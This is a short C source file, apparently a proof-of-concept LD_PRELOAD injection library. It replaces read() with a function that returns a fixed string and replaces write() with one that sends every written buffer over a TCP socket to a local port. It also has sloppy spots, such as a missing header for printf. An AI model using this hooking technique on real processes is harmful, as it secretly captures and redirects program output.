/*
* To change this license header, choose License Headers in Project Properties. * To change this template file, choose Tools | Templates
* and open the template in the editor.
 */
// LD_PRELOAD=./libinjection-so.so ./code-injection or export LD_PRELOAD=./libinjection-so.so

#include <string.h>
#include <unistd.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAXLINE 1000000
#define SERVER_ADDR "127.0.0.1"
#define TESTFILE "./temp"
#define PORT 9090

static int inj_sockfd = -1;

static struct sockaddr_in inj_servaddr;

ssize_t read(int fd, void *buf, size_t size) {
    strcpy(buf, "I love cats");
    return 12;
}


ssize_t write(int fd, const void *buf, size_t size) {

    if (inj_sockfd == -1) {
        inj_sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (inj_sockfd < 0) {
            printf("socket error");
            return 1;
        }
        bzero(&inj_servaddr, sizeof(inj_servaddr));
        inj_servaddr.sin_family = AF_INET;
        inj_servaddr.sin_port = htons(PORT);

        if (inet_pton(AF_INET, SERVER_ADDR, &inj_servaddr.sin_addr) <= 0) {
            printf("inet_pton error");
            return 1;
        }
        if (connect(inj_sockfd, (struct sockaddr *)&inj_servaddr, sizeof(inj_servaddr)) < 0) {
            perror("connect error");
            return 1;
        }
        printf("client connect ok : inj_sockfd = %d\n", inj_sockfd);
    }

    int nwrite = 0;
    if ((nwrite = send(inj_sockfd, buf, size, NULL)) < 0) {
        printf("nwrite = %d\n", nwrite);
        perror("write error");
    }


    return nwrite;
}

